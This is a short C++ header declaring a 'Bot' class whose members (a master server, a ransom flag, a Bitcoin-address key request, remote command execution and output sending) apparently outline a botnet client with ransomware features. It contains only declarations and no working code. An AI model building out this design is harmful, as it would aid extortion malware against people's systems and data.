#pragma once
#ifndef BOT_H
#define BOT_H
#include<stdio.h>
#include<string>
using namespace std;
class Bot
{
private:
    string platform;
    string uid;
    string username;
    string hostname;
    string master;
    bool ransom;
public:
    Bot(string p, string id, string user, string host, string m);
    string get_platform();
    string get_user();
    string get_uid();
    string get_hostname();
    string get_master();
    bool get_ransom();
    string form_ping_json();
    void display_message(string message);
    string ping_server();
    string send_key();
    string request_key(string btc_addr);
    string send_output(string output);
    string run_command(string command);
    void run();
};


#endif